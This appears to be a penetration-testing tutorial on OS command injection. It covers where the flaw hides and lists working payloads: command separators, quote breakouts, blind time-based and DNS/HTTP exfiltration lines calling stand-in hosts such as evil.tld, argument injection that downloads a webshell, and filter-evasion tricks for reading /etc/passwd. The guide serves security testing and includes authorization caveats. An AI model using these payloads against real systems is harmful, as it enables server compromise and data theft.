# Command Injection

When user input reaches a shell, you can run commands on the server. It is less common than it was because developers moved to library calls, but it survives in the places that still shell out: image/video processing, PDF generation, network tools (ping, nslookup, whois), archive handling, backup and admin features, and third-party integrations.

## The mental model

The app builds an OS command string that includes your input and runs it via a shell. Shell metacharacters (`;`, `|`, `&`, `` ` ``, `$()`, newlines) let you terminate the intended command and append your own, or inject arguments. Even "argument-only" injection (you cannot add a new command but control a flag) can be dangerous when the invoked program has flags that read/write files or execute code.

## Where it hides / tell-tales

- **Features that wrap CLI tools**: ping/traceroute/nslookup/whois/dig in network dashboards, `convert`/`ffmpeg`/`gs` for media, `pdflatex`/`wkhtmltopdf` for PDFs, `tar`/`unzip`/`7z` for archives, `git`/`svn` integrations, backup/restore, and "run diagnostic" admin tools.
- **Filenames and metadata reaching a shell**: an uploaded filename, EXIF data, or a URL passed to a command-line downloader.
- **Blind signals**: no output, but time delays (`sleep`), DNS/HTTP callbacks, or error differences. Most real command injection today is blind.
- **Argument injection**: input placed as an argument (not concatenated into a full command) where you can smuggle extra flags (`--output`, `-o`, `@file`, `--exec`).

## Real material

Separators and substitution to append a command:

```
; id
| id
|| id
&& id
`id`
$(id)
%0a id            (newline)
; ping -c1 attacker.tld
```

Context-aware injection (inside an existing quoted argument, break out first):

```
127.0.0.1; id
127.0.0.1" ; id ; echo "
'$(id)'
```

Blind confirmation (time-based and OOB, when nothing reflects):

```
; sleep 5
| sleep 5
$(sleep 5)
; nslookup $(whoami).evil.tld      (OOB: your DNS server logs the hostname = command output)
; curl http://evil.tld/$(id | base64)
```

Argument injection example (you cannot add `;` but you control an argument to `curl`/`wget`/`tar`):

```
# if app runs:  curl <userinput>
--output /var/www/html/shell.php http://evil.tld/shell
# if app runs:  tar <userinput>
--checkpoint=1 --checkpoint-action=exec=sh\ shell.sh
```

WAF/filter evasion when metacharacters or keywords are filtered:

```
# spaces filtered
cat${IFS}/etc/passwd
{cat,/etc/passwd}
cat</etc/passwd
# keyword filtered (split with concatenation/quotes/vars)
c''at /etc/pa''sswd
/bin/c?t /etc/passwd
$(printf '\x69\x64')          (build "id" from hex)
# use alternatives
cat$()  /etc/passwd ; i\d
```

## Beyond the basics

- **Assume blind and build an oracle**: a reliable workflow is time-based first (`sleep`), then OOB exfiltration via DNS (works even when HTTP egress is blocked, since DNS resolution often is not). Exfiltrate command output by embedding it in a DNS subdomain you control (`$(cmd).evil.tld`).
- **Argument injection is underrated**: when you cannot inject a new command, controlling one argument to a powerful binary is often enough. `curl`/`wget` with `-o`/`--output` writes files (webshell); `tar`/`rsync`/`zip` with `--exec`/checkpoint actions run commands; `ffmpeg` and `convert` read local files via protocol handlers (SSRF/file read); `git` config/`-c core.sshCommand` runs commands. Learn the dangerous flags of common tools.
- **Second-order command injection**: input stored (a device name, a hostname, a filename) and later passed to a shell by a cron job, a backup script, or an admin action. The fire is delayed and elsewhere; plant canaries that `sleep` or call back.
- **Injection via indirect sinks**: `os.system`/`exec`/`popen`/`subprocess(shell=True)` in Python, backticks/`system`/`exec` in PHP/Perl/Ruby, `Runtime.exec` with a shell wrapper in Java, `child_process.exec` (shell) vs `execFile` (no shell) in Node. `exec` with a shell is vulnerable; `execFile`/`spawn` without `shell:true` is usually not, which tells you where to look.
- **Environment and wrapper tricks**: `IFS` manipulation, brace expansion, variable indirection, globbing (`/???/??t /???/p??s??`), and reading via `<`/`<<<` to avoid `cat`. These defeat naive keyword/space filters.
- **From injection to foothold**: a confirmed RCE should be demonstrated minimally (`id`, `hostname`), then reported. The realistic escalation is reverse shell, reading cloud credentials (`~/.aws/credentials`, instance metadata, see `../cloud-and-infra/Cloud-Metadata-and-SSRF-to-Cloud.md`), and pivoting, but only within authorized scope.

## What to watch for

- A delay could be coincidental load; confirm with differential timing (`sleep 0` vs `sleep 5`, repeated) and prefer OOB callbacks for certainty.
- `shell=False`/`execFile`/parameterized exec is generally safe from classic injection; focus on the shell-invoking sinks and on argument injection into the invoked program.
- Blocked HTTP egress does not mean blind injection is unconfirmable; use DNS.
- RCE runs real commands on production; keep proof harmless, remove any file you write, and do not pivot without explicit authorization.

## Hunting checklist

- Find features that shell out (network tools, media/PDF/archive processing, integrations, admin/backup).
- Inject the separator set; if nothing reflects, switch to time-based and DNS-OOB oracles.
- Test argument injection into the invoked binary (dangerous flags) when command separators are filtered.
- Apply filter-evasion (IFS, brace expansion, globbing, hex/printf) where metacharacters/keywords are blocked.
- Plant canaries for second-order injection in stored fields processed later.
- Identify the sink type (shell vs no-shell exec) to prioritize.
